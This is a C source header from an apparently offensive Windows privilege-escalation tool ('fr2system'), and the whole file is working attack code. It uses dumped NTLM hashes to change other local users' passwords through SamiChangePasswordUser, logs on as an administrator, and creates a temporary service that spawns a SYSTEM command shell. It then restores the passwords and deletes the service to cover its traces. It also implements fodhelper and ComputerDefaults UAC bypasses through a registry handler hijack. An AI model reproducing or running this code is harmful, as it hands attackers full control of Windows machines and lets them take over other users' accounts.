#pragma once
// fr2system - Escalation module
// SamiChangePasswordUser → LogonUserEx → CreateService → SYSTEM
// + password restore + cleanup

#include "common.h"
#include "crypto.h"
#include <winternl.h>
#include <objbase.h>
#include <shellapi.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Secur32.lib")

#define _NTDEF_
#include <ntsecapi.h>

// ── Dynamically imported SAM functions ──
typedef NTSTATUS(WINAPI* pfnSamConnect)(PUNICODE_STRING, HANDLE*, ACCESS_MASK, BOOLEAN);
typedef NTSTATUS(WINAPI* pfnSamCloseHandle)(HANDLE);
typedef NTSTATUS(WINAPI* pfnSamOpenDomain)(HANDLE, ACCESS_MASK, PSID, HANDLE*);
typedef NTSTATUS(WINAPI* pfnSamOpenUser)(HANDLE, ACCESS_MASK, DWORD, HANDLE*);
typedef NTSTATUS(WINAPI* pfnSamiChangePasswordUser)(HANDLE, BOOL, const BYTE*, const BYTE*, BOOL, const BYTE*, const BYTE*);

static struct {
    HMODULE hSamlib;
    pfnSamConnect           SamConnect;
    pfnSamCloseHandle       SamCloseHandle;
    pfnSamOpenDomain        SamOpenDomain;
    pfnSamOpenUser          SamOpenUser;
    pfnSamiChangePasswordUser SamiChangePasswordUser;
} g_Sam = { 0 };

static BOOL FR2S_LoadSamLib() {
    if (g_Sam.hSamlib) return TRUE;

    wchar_t path[MAX_PATH];
    ExpandEnvironmentStringsW(L"%windir%\\System32\\samlib.dll", path, MAX_PATH);
    g_Sam.hSamlib = LoadLibraryW(path);
    if (!g_Sam.hSamlib) {
        FR2S_Err("Failed to load samlib.dll, error: %d", GetLastError());
        return FALSE;
    }

    g_Sam.SamConnect = (pfnSamConnect)GetProcAddress(g_Sam.hSamlib, "SamConnect");
    g_Sam.SamCloseHandle = (pfnSamCloseHandle)GetProcAddress(g_Sam.hSamlib, "SamCloseHandle");
    g_Sam.SamOpenDomain = (pfnSamOpenDomain)GetProcAddress(g_Sam.hSamlib, "SamOpenDomain");
    g_Sam.SamOpenUser = (pfnSamOpenUser)GetProcAddress(g_Sam.hSamlib, "SamOpenUser");
    g_Sam.SamiChangePasswordUser = (pfnSamiChangePasswordUser)GetProcAddress(g_Sam.hSamlib, "SamiChangePasswordUser");

    if (!g_Sam.SamConnect || !g_Sam.SamCloseHandle || !g_Sam.SamOpenDomain ||
        !g_Sam.SamOpenUser || !g_Sam.SamiChangePasswordUser) {
        FR2S_Err("Failed to resolve SAM functions");
        return FALSE;
    }
    return TRUE;
}

// ── Change password using NTLM hash ──
static BOOL FR2S_ChangePassword(const wchar_t* username, const BYTE* oldNTLM, const BYTE* newNTLM) {
    if (!FR2S_LoadSamLib()) return FALSE;

    NTSTATUS status;
    HANDLE hServer = NULL, hDomain = NULL, hUser = NULL;
    BOOL ret = FALSE;

    // Connect to local SAM
    status = g_Sam.SamConnect(NULL, &hServer, MAXIMUM_ALLOWED, FALSE);
    if (status) {
        FR2S_Err("SamConnect failed: 0x%08X", status);
        return FALSE;
    }

    // Get machine SID via LSA
    LSA_OBJECT_ATTRIBUTES loa = { 0 };
    LSA_HANDLE hLsa = NULL;
    status = LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hLsa);
    if (status) {
        FR2S_Err("LsaOpenPolicy failed: 0x%08X", status);
        g_Sam.SamCloseHandle(hServer);
        return FALSE;
    }

    POLICY_ACCOUNT_DOMAIN_INFO* domainInfo = NULL;
    status = LsaQueryInformationPolicy(hLsa, PolicyAccountDomainInformation, (PVOID*)&domainInfo);
    if (status || !domainInfo) {
        FR2S_Err("LsaQueryInformationPolicy failed: 0x%08X", status);
        LsaClose(hLsa);
        g_Sam.SamCloseHandle(hServer);
        return FALSE;
    }

    // Lookup username → RID
    LSA_UNICODE_STRING lsaName;
    RtlInitUnicodeString((PUNICODE_STRING)&lsaName, username);
    LSA_REFERENCED_DOMAIN_LIST* refDomains = NULL;
    LSA_TRANSLATED_SID* translatedSid = NULL;
    status = LsaLookupNames(hLsa, 1, &lsaName, &refDomains, &translatedSid);
    if (status) {
        FR2S_Err("LsaLookupNames failed for %ws: 0x%08X", username, status);
        goto cleanup;
    }

    // Open domain and user
    status = g_Sam.SamOpenDomain(hServer, MAXIMUM_ALLOWED, domainInfo->DomainSid, &hDomain);
    if (status) {
        FR2S_Err("SamOpenDomain failed: 0x%08X", status);
        goto cleanup;
    }

    status = g_Sam.SamOpenUser(hDomain, MAXIMUM_ALLOWED, translatedSid->RelativeId, &hUser);
    if (status) {
        FR2S_Err("SamOpenUser failed for %ws: 0x%08X", username, status);
        goto cleanup;
    }

    // Change password
    BYTE emptyLM[16];
    memset(emptyLM, 0, sizeof(emptyLM));
    status = g_Sam.SamiChangePasswordUser(hUser, FALSE, emptyLM, emptyLM, TRUE, oldNTLM, newNTLM);
    if (status) {
        FR2S_Err("SamiChangePasswordUser failed for %ws: 0x%08X", username, status);
        goto cleanup;
    }

    ret = TRUE;

cleanup:
    if (hUser) g_Sam.SamCloseHandle(hUser);
    if (hDomain) g_Sam.SamCloseHandle(hDomain);
    if (hServer) g_Sam.SamCloseHandle(hServer);
    if (hLsa) LsaClose(hLsa);
    return ret;
}

// ── Check if a token belongs to an admin ──
// Enumerates token groups directly — works regardless of UAC filtering,
// deny-only attributes, or FilterAdministratorToken policy
static BOOL FR2S_IsTokenAdmin(HANDLE hToken) {
    DWORD needed = 0;
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &needed);
    if (needed == 0) return FALSE;

    TOKEN_GROUPS* groups = (TOKEN_GROUPS*)malloc(needed);
    if (!groups) return FALSE;

    if (!GetTokenInformation(hToken, TokenGroups, groups, needed, &needed)) {
        free(groups);
        return FALSE;
    }

    DWORD sidSize = SECURITY_MAX_SID_SIZE;
    PSID adminSid = (PSID)malloc(sidSize);
    if (!adminSid) { free(groups); return FALSE; }
    CreateWellKnownSid(WinBuiltinAdministratorsSid, NULL, adminSid, &sidSize);

    BOOL found = FALSE;
    for (DWORD i = 0; i < groups->GroupCount; i++) {
        if (EqualSid(groups->Groups[i].Sid, adminSid)) {
            found = TRUE;
            break;
        }
    }

    free(adminSid);
    free(groups);
    return found;
}

// ── Get elevated token via batch logon ──
static HANDLE FR2S_GetElevatedToken(const wchar_t* username, const wchar_t* password) {
    HANDLE hToken = NULL;
    PSID logonSid = NULL;
    if (!LogonUserExW(username, NULL, password, LOGON32_LOGON_BATCH,
        LOGON32_PROVIDER_DEFAULT, &hToken, &logonSid, NULL, NULL, NULL)) {
        FR2S_Err("LogonUserEx (batch) failed for %ws: %d", username, GetLastError());
        return NULL;
    }
    return hToken;
}

// ── Escalate via BATCH logon + integrity lowering + impersonation ──
// This is BlueHammer's technique:
// 1. LogonUserEx with LOGON32_LOGON_BATCH → primary token
// 2. Lower token integrity to Medium (S-1-16-8192)
//    This is the KEY trick — impersonation from a Medium integrity process
//    to a High integrity token gets downgraded to Identification level.
//    By lowering the token to Medium FIRST, ImpersonateLoggedOnUser succeeds
//    at Impersonation level, allowing SCM access.
// 3. ImpersonateLoggedOnUser → OpenSCManager → CreateService → SYSTEM
static BOOL FR2S_EscalateViaService(const wchar_t* adminUser, const wchar_t* adminPass, DWORD sessionId) {
    HANDLE hBatchToken = NULL;
    PSID logonSid = NULL;
    BOOL ret = FALSE;

    // Step 1: BATCH logon
    if (!LogonUserExW(adminUser, NULL, adminPass,
        LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT,
        &hBatchToken, &logonSid, NULL, NULL, NULL)) {
        FR2S_Err("LogonUserEx (BATCH) failed for %ws: %d", adminUser, GetLastError());
        return FALSE;
    }

    // Step 2: Lower integrity to Medium (S-1-16-8192)
    // Without this, ImpersonateLoggedOnUser gives Identification-level token
    // which can't be used for SCM access
    PSID mediumSid = NULL;
    if (ConvertStringSidToSidW(L"S-1-16-8192", &mediumSid)) {
        TOKEN_MANDATORY_LABEL tml;
        ZeroMemory(&tml, sizeof(tml));
        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = mediumSid;
        if (!SetTokenInformation(hBatchToken, TokenIntegrityLevel, &tml,
            sizeof(tml) + GetLengthSid(mediumSid))) {
            FR2S_Warn("SetTokenInformation (integrity) failed: %d", GetLastError());
        }
        LocalFree(mediumSid);
    }

    // Step 3: Impersonate
    if (!ImpersonateLoggedOnUser(hBatchToken)) {
        FR2S_Err("ImpersonateLoggedOnUser failed: %d", GetLastError());
        CloseHandle(hBatchToken);
        return FALSE;
    }

    // Step 4: Create service
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        FR2S_Err("OpenSCManager failed: %d", GetLastError());
        RevertToSelf();
        CloseHandle(hBatchToken);
        return FALSE;
    }

    GUID guid;
    CoCreateGuid(&guid);
    wchar_t svcName[64];
    wsprintfW(svcName, L"fr2s_%08X", guid.Data1);

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t binPath[MAX_PATH * 2];
    wsprintfW(binPath, L"\"%s\" --service %d", exePath, sessionId);

    SC_HANDLE hSvc = CreateServiceW(hSCM, svcName, svcName,
        GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        binPath, NULL, NULL, NULL, NULL, NULL);

    if (hSvc) {
        FR2S_Ok("Service created: %ws", svcName);
        StartServiceW(hSvc, 0, NULL);
        Sleep(1000);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
        ret = TRUE;
    }
    else {
        FR2S_Err("CreateService failed: %d", GetLastError());
    }

    CloseServiceHandle(hSCM);
    RevertToSelf();
    CloseHandle(hBatchToken);
    return ret;
}

// ── Called when running as the admin user (--create-service) ──
static int FR2S_CreateServiceHelper(DWORD sessionId) {
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        FR2S_Err("OpenSCManager failed: %d", GetLastError());
        return 1;
    }

    GUID guid;
    CoCreateGuid(&guid);
    wchar_t svcName[64];
    wsprintfW(svcName, L"fr2s_%08X", guid.Data1);

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    wchar_t binPath[MAX_PATH * 2];
    wsprintfW(binPath, L"\"%s\" --service %d", exePath, sessionId);

    SC_HANDLE hSvc = CreateServiceW(hSCM, svcName, svcName,
        GENERIC_ALL, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        binPath, NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        FR2S_Err("CreateService failed: %d", GetLastError());
        CloseServiceHandle(hSCM);
        return 1;
    }

    FR2S_Ok("Service created: %ws", svcName);
    StartServiceW(hSvc, 0, NULL);
    Sleep(1000);

    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return 0;
}

// ── Launch SYSTEM shell in user's session ──
static BOOL FR2S_LaunchSystemShell(DWORD sessionId) {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
        return FALSE;

    // Enable required privileges
    TOKEN_PRIVILEGES tp;
    LUID luid;
    const wchar_t* privs[] = { SE_TCB_NAME, SE_ASSIGNPRIMARYTOKEN_NAME, SE_IMPERSONATE_NAME, SE_DEBUG_NAME };
    for (int i = 0; i < 4; i++) {
        if (LookupPrivilegeValueW(NULL, privs[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        }
    }

    HANDLE hNewToken = NULL;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hNewToken)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);

    if (!SetTokenInformation(hNewToken, TokenSessionId, &sessionId, sizeof(DWORD))) {
        CloseHandle(hNewToken);
        return FALSE;
    }

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe";

    BOOL created = CreateProcessAsUserW(hNewToken, NULL, cmd, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);

    CloseHandle(hNewToken);
    if (created) {
        FR2S_Ok("SYSTEM shell launched in session %d (PID: %d)", sessionId, pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return created;
}

// ── Check if running as SYSTEM ──
static BOOL FR2S_IsSystem() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    BYTE buf[256];
    DWORD retLen = 0;
    if (!GetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &retLen)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);

    TOKEN_USER* tokenUser = (TOKEN_USER*)buf;
    return IsWellKnownSid(tokenUser->User.Sid, WinLocalSystemSid);
}

// ── UAC Bypass: fodhelper.exe (ms-settings handler hijack) ──
// Works on Windows 10/11. No password change needed.
// fodhelper.exe has autoElevate=true in its manifest and reads
// HKCU\Software\Classes\ms-settings\Shell\Open\command
static BOOL FR2S_UACBypassFodhelper(DWORD sessionId) {
    const wchar_t* regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    HKEY hKey = NULL;
    BOOL ret = FALSE;
    DWORD disp = 0;

    // Build payload command
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t cmdLine[MAX_PATH * 2];
    wsprintfW(cmdLine, L"\"%s\" --create-service %d", exePath, sessionId);

    // Create registry key
    LONG err = RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disp);
    if (err != ERROR_SUCCESS) {
        FR2S_Err("RegCreateKeyEx failed: %d", err);
        return FALSE;
    }

    // Set default value = our command
    err = RegSetValueExW(hKey, NULL, 0, REG_SZ,
        (const BYTE*)cmdLine, (DWORD)(wcslen(cmdLine) + 1) * sizeof(wchar_t));
    if (err != ERROR_SUCCESS) {
        FR2S_Err("RegSetValueEx (default) failed: %d", err);
        RegCloseKey(hKey);
        goto cleanup;
    }

    // Set DelegateExecute = "" (required to trigger command instead of COM)
    {
        wchar_t empty[] = L"";
        err = RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
            (const BYTE*)empty, sizeof(empty));
    }
    RegCloseKey(hKey);
    hKey = NULL;

    if (err != ERROR_SUCCESS) {
        FR2S_Err("RegSetValueEx (DelegateExecute) failed: %d", err);
        goto cleanup;
    }

    FR2S_Ok("Registry keys set for fodhelper bypass");

    // Launch fodhelper.exe (auto-elevates without UAC prompt)
    {
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"open";
        sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
        sei.nShow = SW_HIDE;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        if (!ShellExecuteExW(&sei)) {
            FR2S_Err("ShellExecuteEx fodhelper failed: %d", GetLastError());
            goto cleanup;
        }

        FR2S_Log("Waiting for fodhelper to execute payload...");

        // Wait for fodhelper to launch and our service helper to run
        if (sei.hProcess) {
            WaitForSingleObject(sei.hProcess, 10000);
            CloseHandle(sei.hProcess);
        }
        Sleep(2000); // Extra time for service to start

        ret = TRUE;
        FR2S_Ok("UAC bypass via fodhelper executed");
    }

cleanup:
    // Clean up registry keys
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    FR2S_Log("Registry cleanup done");
    return ret;
}

// ── UAC Bypass: computerdefaults.exe (fallback) ──
// Same technique, different auto-elevated binary
static BOOL FR2S_UACBypassComputerDefaults(DWORD sessionId) {
    const wchar_t* regPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    HKEY hKey = NULL;
    BOOL ret = FALSE;
    DWORD disp = 0;

    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t cmdLine[MAX_PATH * 2];
    wsprintfW(cmdLine, L"\"%s\" --create-service %d", exePath, sessionId);

    LONG err = RegCreateKeyExW(HKEY_CURRENT_USER, regPath, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, &disp);
    if (err != ERROR_SUCCESS) return FALSE;

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        (const BYTE*)cmdLine, (DWORD)(wcslen(cmdLine) + 1) * sizeof(wchar_t));

    wchar_t empty[] = L"";
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
        (const BYTE*)empty, sizeof(empty));
    RegCloseKey(hKey);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"C:\\Windows\\System32\\ComputerDefaults.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExW(&sei)) {
        goto cleanup;
    }

    FR2S_Log("Waiting for computerdefaults to execute payload...");
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 10000);
        CloseHandle(sei.hProcess);
    }
    Sleep(2000);
    ret = TRUE;
    FR2S_Ok("UAC bypass via computerdefaults executed");

cleanup:
    RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    return ret;
}

// ── Main escalation chain ──
// For each credential: change password → logon → check admin → escalate → restore
static BOOL FR2S_Escalate(FR2S_CREDENTIAL* creds, int credCount, BOOL dumpOnly) {
    if (dumpOnly) return TRUE;

    // Compute NTLM of our temp password
    BYTE newNTLM[16];
    FR2S_ComputeNTLM(FR2S_TEMP_PASSWORD, newNTLM);

    DWORD sessionId = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);

    BOOL systemShellLaunched = FALSE;

    for (int i = 0; i < credCount; i++) {
        FR2S_CREDENTIAL* cred = &creds[i];

        if (cred->isCurrentUser) {
            FR2S_Log("Skipping current user: %ws", cred->username);
            continue;
        }
        if (cred->ntlmHashLen == 0) {
            FR2S_Log("Skipping %ws: empty NTLM hash", cred->username);
            continue;
        }
        if (_wcsicmp(cred->username, L"WDAGUtilityAccount") == 0) {
            FR2S_Log("Skipping WDAGUtilityAccount");
            continue;
        }
        if (_wcsicmp(cred->username, L"DefaultAccount") == 0) {
            FR2S_Log("Skipping DefaultAccount");
            continue;
        }
        if (_wcsicmp(cred->username, L"Guest") == 0) {
            FR2S_Log("Skipping Guest");
            continue;
        }

        FR2S_Log("Trying user: %ws (RID: %d)", cred->username, cred->rid);

        // Step 1: Change password
        if (!FR2S_ChangePassword(cred->username, cred->ntlmHash, newNTLM)) {
            FR2S_Err("Password change failed for %ws", cred->username);
            continue;
        }
        FR2S_Ok("Password changed for %ws", cred->username);

        // Step 2: Logon with new password
        HANDLE hToken = NULL;
        PSID logonSid = NULL;
        if (!LogonUserExW(cred->username, NULL, FR2S_TEMP_PASSWORD_W,
            LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
            &hToken, &logonSid, NULL, NULL, NULL)) {
            DWORD logonErr = GetLastError();

            // Error 1907: PASSWORD_MUST_CHANGE — Win11 sets this on new accounts.
            // SamiChangePasswordUser can't clear this flag.
            // Try alternative logon types that may bypass the check.
            if (logonErr == 1907) {
                FR2S_Warn("Must-change flag. Trying BATCH logon...");
                if (LogonUserExW(cred->username, NULL, FR2S_TEMP_PASSWORD_W,
                    LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT,
                    &hToken, &logonSid, NULL, NULL, NULL)) {
                    logonErr = 0;
                    FR2S_Ok("BATCH logon succeeded (bypassed must-change)");
                } else {
                    DWORD batchErr = GetLastError();
                    FR2S_Warn("BATCH logon failed: %d. Trying NETWORK...", batchErr);
                    if (LogonUserExW(cred->username, NULL, FR2S_TEMP_PASSWORD_W,
                        LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT,
                        &hToken, &logonSid, NULL, NULL, NULL)) {
                        logonErr = 0;
                        FR2S_Ok("NETWORK logon succeeded (bypassed must-change)");
                    } else {
                        FR2S_Warn("NETWORK logon failed: %d. Trying SERVICE...", GetLastError());
                        if (LogonUserExW(cred->username, NULL, FR2S_TEMP_PASSWORD_W,
                            LOGON32_LOGON_SERVICE, LOGON32_PROVIDER_DEFAULT,
                            &hToken, &logonSid, NULL, NULL, NULL)) {
                            logonErr = 0;
                            FR2S_Ok("SERVICE logon succeeded (bypassed must-change)");
                        } else {
                            logonErr = GetLastError();
                        }
                    }
                }
            }

            if (logonErr != 0) {
                FR2S_Err("LogonUserEx failed for %ws: %d", cred->username, logonErr);
                // CRITICAL: restore password before continuing
                FR2S_ChangePassword(cred->username, newNTLM, cred->ntlmHash);
                continue;
            }
        }

        // Step 3: Check if admin
        BOOL isAdmin = FR2S_IsTokenAdmin(hToken);
        cred->isAdmin = isAdmin;
        FR2S_Log("  IsAdmin: %s", isAdmin ? "TRUE" : "FALSE");

        // Step 4: If admin and no SYSTEM shell yet, escalate
        if (isAdmin && !systemShellLaunched) {
            if (FR2S_EscalateViaService(cred->username, FR2S_TEMP_PASSWORD_W, sessionId)) {
                FR2S_Ok("SYSTEM escalation triggered via %ws", cred->username);
                systemShellLaunched = TRUE;
            }
        }

        CloseHandle(hToken);

        // Step 5: Restore original password
        if (FR2S_ChangePassword(cred->username, newNTLM, cred->ntlmHash)) {
            FR2S_Ok("Password restored for %ws", cred->username);
        }
        else {
            FR2S_Err("CRITICAL: Failed to restore password for %ws!", cred->username);
        }
    }

    // ── Fallback: use current user via UAC bypass (no password change needed) ──
    if (!systemShellLaunched) {
        FR2S_Warn("No other admin accounts found. Trying current user self-escalation...");

        HANDLE hSelfToken = NULL;
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hSelfToken);
        BOOL selfIsAdmin = hSelfToken ? FR2S_IsTokenAdmin(hSelfToken) : FALSE;
        if (hSelfToken) CloseHandle(hSelfToken);

        if (selfIsAdmin) {
            FR2S_Log("Current user is admin (UAC-filtered). Using UAC bypass (fodhelper)...");
            systemShellLaunched = FR2S_UACBypassFodhelper(sessionId);

            if (!systemShellLaunched) {
                FR2S_Warn("fodhelper bypass failed. Trying computerdefaults...");
                systemShellLaunched = FR2S_UACBypassComputerDefaults(sessionId);
            }
        }
        else {
            FR2S_Warn("Current user is not admin. Cannot self-escalate.");
        }
    }

    return systemShellLaunched;
}
